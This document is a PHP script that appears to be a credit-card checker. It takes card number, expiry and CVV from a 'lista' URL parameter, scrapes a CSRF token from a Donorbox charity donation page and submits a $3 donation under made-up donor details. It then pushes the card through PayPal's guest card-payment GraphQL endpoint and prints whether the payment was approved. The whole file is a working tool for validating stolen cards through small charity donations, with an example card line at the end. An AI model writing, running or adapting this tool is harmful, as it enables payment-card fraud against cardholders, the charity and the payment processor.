<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Function to make HTTP requests
function makeRequest($url, $headers = [], $data = null, $method = 'GET') {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data) {
            if (is_array($data)) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
            } else {
                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            }
        }
    }
    
    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }
    
    // For session persistence
    static $cookieFile = null;
    if ($cookieFile === null) {
        $cookieFile = tempnam(sys_get_temp_dir(), 'cookies');
    }
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return [
        'status' => $httpCode,
        'body' => $response
    ];
}

// Function to extract CSRF token from HTML
function extractCsrfToken($html) {
    $dom = new DOMDocument();
    @$dom->loadHTML($html);
    $metas = $dom->getElementsByTagName('meta');
    
    for ($i = 0; $i < $metas->length; $i++) {
        $meta = $metas->item($i);
        if ($meta->getAttribute('name') == 'csrf-token') {
            return $meta->getAttribute('content');
        }
    }
    return null;
}

// Main execution
if (isset($_GET['lista'])) {
    $cardDetails = $_GET['lista'];
    $cardParts = explode('|', $cardDetails);
    
    if (count($cardParts) < 3) {
        die("Invalid card format. Use: cardNumber|expiryDate|cvv");
    }
    
    $cardNumber = $cardParts[0];
    $expiryDate = $cardParts[1];
    $cvv = $cardParts[2];
    
    // Step 1: Load donorbox page and get CSRF token
    $donorboxUrl = "https://donorbox.org/endofyear-2024-appeal";
    $donationUrl = "https://donorbox.org/donation";
    $paypalUrl = "https://www.paypal.com/graphql?fetch_credit_form_submit";
    
    $baseHeaders = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language: en-US,en;q=0.9",
    ];
    
    $response = makeRequest($donorboxUrl, $baseHeaders);
    echo "Page load status: " . $response['status'] . "<br>";
    
    $csrfToken = extractCsrfToken($response['body']);
    if (!$csrfToken) {
        die("CSRF token not found!");
    }
    echo "✅ CSRF Token: " . $csrfToken . "<br>";
    
    // Step 2: Submit donation form
    $donationData = [
        "authenticity_token" => $csrfToken,
        "donation[first_name]" => "Vikram",
        "donation[last_name]" => "Lal",
        "donation[email]" => "araumari42@gmail.com",
        "donation[phone]" => "17864920810",
        "donation[country]" => "US",
        "donation[address]" => "New York",
        "donation[zip_code]" => "10080",
        "donation[city]" => "New York",
        "donation[state]" => "NY",
        "donation[custom_amount]" => "3",
        "donation_type" => "paypal_express",
        "slug" => "endofyear-2024-appeal",
        "processor" => "paypal_v2",
        "paypal_funding_source" => "card"
    ];
    
    $donateHeaders = array_merge($baseHeaders, [
        "X-CSRF-Token: " . $csrfToken,
        "X-Requested-With: XMLHttpRequest",
        "Content-Type: application/x-www-form-urlencoded"
    ]);
    
    $donateResponse = makeRequest($donationUrl, $donateHeaders, $donationData, 'POST');
    echo "POST Status: " . $donateResponse['status'] . "<br>";
    echo "Response: " . $donateResponse['body'] . "<br>";
    
    // Extract order_id from JSON response
    $responseData = json_decode($donateResponse['body'], true);
    $orderId = $responseData['order_id'] ?? null;
    
    if (!$orderId) {
        die("❌ Could not extract order_id from response!");
    }
    echo "✅ Extracted PayPal Token (order_id): " . $orderId . "<br>";
    
    // Step 3: Submit payment to PayPal
    $paypalHeaders = array_merge($baseHeaders, [
        "Content-Type: application/json",
        "Origin: https://www.paypal.com",
        "X-App-Name: standardcardfields",
        "X-Country: US"
    ]);
    
    $paypalData = [
        "query" => "mutation payWithCard(
            \$token: String!,
            \$card: CardInput,
            \$firstName: String,
            \$lastName: String,
            \$email: String,
            \$billingAddress: AddressInput
        ) {
            approveGuestPaymentWithCreditCard(
                token: \$token,
                card: \$card,
                firstName: \$firstName,
                lastName: \$lastName,
                email: \$email,
                billingAddress: \$billingAddress
            ) {
                cart {
                    intent
                    cartId
                    buyer { userId }
                }
            }
        }",
        "variables" => [
            "token" => $orderId,
            "card" => [
                "cardNumber" => $cardNumber,
                "type" => "VISA", // You might want to detect this from the card number
                "expirationDate" => $expiryDate,
                "postalCode" => "10080",
                "securityCode" => $cvv
            ],
            "firstName" => "Vram",
            "lastName" => "Lal",
            "billingAddress" => [
                "line1" => "New York",
                "city" => "New York",
                "state" => "NY",
                "postalCode" => "10080",
                "country" => "US"
            ],
            "email" => "araumari42@gmail.com"
        ]
    ];
    
    $paypalResponse = makeRequest($paypalUrl, $paypalHeaders, json_encode($paypalData), 'POST');
    echo "PayPal Status: " . $paypalResponse['status'] . "<br>";
    echo "PayPal Response: " . $paypalResponse['body'] . "<br>";
    
    // Final response
    $finalResponse = json_decode($paypalResponse['body'], true);
    if (isset($finalResponse['data']['approveGuestPaymentWithCreditCard']['cart'])) {
        echo "<h2>✅ Payment Successful!</h2>";
        echo "Cart ID: " . $finalResponse['data']['approveGuestPaymentWithCreditCard']['cart']['cartId'] . "<br>";
    } else {
        echo "<h2>❌ Payment Failed</h2>";
        if (isset($finalResponse['errors'])) {
            foreach ($finalResponse['errors'] as $error) {
                echo "Error: " . $error['message'] . "<br>";
            }
        }
    }
} else {
    // Show form if no card data provided
    echo "<h2>Donation Payment Gateway</h2>";
    echo "<p>Provide card details in the URL parameter: <code>?lista=cardNumber|expiryDate|cvv</code></p>";
    echo "<p>Example: <code>http://localhost:8080/pp.php?lista=4667261379604006|06/2028|289</code></p>";
}
?>